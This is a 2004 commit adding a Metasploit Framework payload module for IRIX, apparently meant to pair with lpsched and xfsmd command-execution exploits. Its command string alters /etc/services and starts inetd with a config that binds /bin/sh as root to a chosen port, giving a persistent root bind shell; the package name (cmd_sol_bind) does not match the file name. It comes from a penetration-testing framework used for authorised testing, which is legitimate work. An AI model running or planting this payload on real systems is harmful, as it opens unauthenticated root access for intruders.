eb7f29523fd2de0891c48b013309856b54186b34
no_author <no_author@no_author>
2004-10-04 23:17:48 +0000

    added payload for lpsched & xfsmd cmd exec exploits

---
+++ payloads/cmd_irix_bind.pm
@@ -0,0 +1,51 @@
+
+##
+# This file is part of the Metasploit Framework and may be redistributed
+# according to the licenses defined in the Authors field below. In the
+# case of an unknown or missing license, this file defaults to the same
+# license as the core Framework (dual GPLv2 and Artistic). The latest
+# version of the Framework can always be obtained from metasploit.com.
+##
+
+package Msf::Payload::cmd_sol_bind;
+use strict;
+use base 'Msf::PayloadComponent::CommandPayload';
+sub load {
+  Msf::PayloadComponent::CommandPayload->import('Msf::PayloadComponent::BindConnection');
+}
+
+my $info =
+{
+  'Name'         => 'Irix Inetd Bind Shell Command',
+  'Version'      => '$Revision$',
+  'Description'  => 'Use inetd to create a persistent bindshell',
+  'Authors'      => [ 'H D Moore <hdm [at] metasploit.com>', ],
+  'Arch'         => [  ],
+  'Priv'         => 0,
+  'OS'           => [ 'irix' ],
+  'Size'         => '',
+};
+
+sub new {
+  load();
+  my $class = shift;
+  my $hash = @_ ? shift : { };
+  $hash = $class->MergeHashRec($hash, {'Info' => $info});
+  my $self = $class->SUPER::new($hash, @_);
+  return($self);
+}
+
+sub CommandString {
+  my $self = shift;
+  my $port = $self->GetVar('LPORT');
+
+  my $command =
+  "grep -v msfbind /etc/services>/tmp/.msf_svcs;".
+  "echo msfbind $port/tcp>>/tmp/.msf_svcs;".
+  "cp /tmp/.msf_svcs /etc/services;".
+  "echo msfbind stream tcp nowait root /bin/sh sh>/tmp/.msf_inet;".
+  "/usr/etc/inetd /tmp/.msf_inet;".
+  "rm /tmp/.msf_inet;";
+
+  return($command);
+}
